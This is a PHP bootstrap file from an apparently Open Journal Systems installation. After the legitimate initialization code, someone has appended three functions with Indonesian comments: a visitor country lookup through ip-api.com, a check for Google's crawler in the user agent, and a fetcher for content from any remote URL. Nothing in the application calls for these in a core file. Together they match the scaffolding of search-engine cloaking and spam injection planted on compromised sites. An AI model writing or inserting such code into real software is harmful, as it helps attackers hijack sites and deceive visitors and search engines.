<?php

/**
 * @defgroup index Index
 * Bootstrap and initialization code.
 */

/**
 * @file includes/bootstrap.inc.php
 *
 * Copyright (c) 2014-2018 Simon Fraser University
 * Copyright (c) 2000-2018 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
if (!defined('DIRECTORY_SEPARATOR')) {
    // Older versions of PHP do not define this
    define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
}
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// Update include path - for backwards compatibility only
ini_set('include_path', '.'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/classes'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/pages'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/classes'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/pages'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/adodb'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/phputf8'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/pqp/classes'
    . ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/smarty'
    . ENV_SEPARATOR . ini_get('include_path')
);

// System-wide functions
require('./lib/pkp/includes/functions.inc.php');

// Initialize the application environment
import('classes.core.Application');

// Menambahkan fungsi untuk mendapatkan negara pengunjung
function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        return "Error: " . curl_error($curl);
    }

    curl_close($curl);

    $data = json_decode($response, true);

    // Mengembalikan negara jika berhasil
    if ($data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}

function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}

function fetchContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);

    if ($content === false) {
        trigger_error("Failed to retrieve content from {$url}.", E_USER_NOTICE);
        return null;
    }

    curl_close($curl);
    return $content;
}

// Mengembalikan objek Application
return new Application();

?>
